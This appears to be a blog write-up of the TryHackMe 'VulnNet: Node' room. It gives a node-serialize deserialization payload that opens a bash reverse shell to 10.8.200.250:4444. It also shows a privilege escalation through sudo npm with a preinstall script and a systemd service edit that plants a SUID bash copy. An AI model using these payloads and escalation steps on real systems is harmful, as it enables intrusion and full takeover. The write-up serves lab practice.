---
title: 'VulnNet: Node'
description: 'NodeJS serialization exploit and privilege escalation through NPM and sudo on vulnnet-job service'
pubDate: 2021-08-24
category: 'tryhackme'
tags: []
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/ccbc0836dcca57cbcb1a270de2daabf0.png'
---

Inputting broken json (base64 encoded) for the session cookie it gives an error about `serialize.js`:

```
...[snip]...
Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
...[snip]...
```

Googling for `node serialize exploit` brings us to this: https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

## RCE
```json
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec(`bash -c 'bash -i >& /dev/tcp/10.8.200.250/4444 0>&1'`).toString();}()","isLoggedIn":true,"encoding": "utf-8"}
```

## USER
Running `sudo -l`:

```bash
...[snip]...
    (serv-manage) NOPASSWD: /usr/bin/npm
```

Create a `package.json` with:
```json
{"scripts": {"preinstall": "/bin/bash"}}
```

Execute as `serv-manage`:
```bash
sudo -u serv-manage /usr/bin/npm -C . --unsafe-perm i
```

```bash
cat /home/serv-manage/user.txt
```

## ROOT

Running `sudo -l`:
```bash
...[snip]...
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

```bash
find / -name vulnnet-auto.timer 2>/dev/null
/etc/systemd/system/vulnnet-auto.timer
```

The service (`vulnnet-auto.timer`) points to a job:
```
...[snip]...
Unit=vulnnet-job.service
...[snip]...
```

Add a command to `/etc/systemd/system/vulnnet-job.service`:
```
ExecStart=/bin/bash -c "cp /bin/bash /tmp/root_bash; chmod u+s /tmp/root_bash"
```

Restart the service:
```bash
sudo /bin/systemctl stop vulnnet-auto.timer
sudo /bin/systemctl start vulnnet-auto.timer
```

Execute the copied bash with root privs:
```bash
/tmp/root_bash -p
```
